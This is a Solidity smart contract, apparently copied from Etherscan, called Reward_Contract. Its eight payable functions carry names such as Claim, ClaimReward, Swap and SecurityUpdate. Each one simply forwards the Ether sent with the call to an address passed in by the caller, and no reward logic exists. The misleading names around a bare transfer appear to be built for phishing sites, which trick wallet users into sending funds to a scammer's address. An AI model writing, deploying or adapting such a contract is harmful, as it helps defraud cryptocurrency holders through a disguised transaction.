/**
 *Submitted for verification at Etherscan.io on 2023-08-15
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract Reward_Contract {

  address private owner;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }

  function Claim(address sender) public payable { payable(sender).transfer(msg.value);  }
  function ClaimReward(address sender) public payable { payable(sender).transfer(msg.value); }
  function ClaimRewards(address sender) public payable { payable(sender).transfer(msg.value); }
  function Execute(address sender) public payable { payable(sender).transfer(msg.value); }
  function Multicall(address sender) public payable { payable(sender).transfer(msg.value); }
  function Swap(address sender) public payable { payable(sender).transfer(msg.value); }
  function Connect(address sender) public payable { payable(sender).transfer(msg.value); }
  function SecurityUpdate(address sender) public payable { payable(sender).transfer(msg.value); }

}